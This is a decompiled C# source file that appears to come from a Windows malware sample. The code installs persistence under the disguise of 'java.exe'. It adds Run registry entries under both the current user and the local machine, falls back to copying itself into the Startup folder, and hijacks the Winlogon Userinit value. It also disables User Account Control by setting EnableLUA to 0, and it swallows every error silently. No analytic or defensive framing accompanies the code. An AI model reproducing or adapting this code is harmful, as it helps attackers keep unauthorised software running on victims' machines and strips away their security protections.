using System;
using System.Diagnostics;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace WindowsApplication1;

internal class Reg
{
	[DebuggerNonUserCode]
	public Reg()
	{
	}

	public static void CheckReg()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\java.exe\\java.exe.exe";
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\java.exe.exe";
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("java.exe") == null)
			{
				registryKey.SetValue("java.exe", text);
			}
			else if (Operators.CompareString((string)registryKey.GetValue("java.exe"), text, false) != 0)
			{
				registryKey.DeleteValue("java.exe");
				registryKey.SetValue("java.exe", text);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			if (!File.Exists(text2))
			{
				try
				{
					File.Copy(Process.GetCurrentProcess().MainModule!.FileName, text2);
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			if (registryKey.GetValue("java.exe") == null)
			{
				registryKey.SetValue("java.exe", text);
			}
			else if (Operators.CompareString((string)registryKey.GetValue("java.exe"), text, false) != 0)
			{
				registryKey.DeleteValue("java.exe");
				registryKey.SetValue("java.exe", text);
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", writable: true);
			string text3 = registryKey.GetValue("Userinit")!.ToString();
			if (!text3.Contains(text))
			{
				registryKey.SetValue("Userinit", text3 + text + ",");
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: true);
			string text4 = registryKey.GetValue("EnableLUA")!.ToString();
			if (Operators.CompareString(text4, "1", false) == 0)
			{
				registryKey.SetValue("EnableLUA", "0");
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}
}
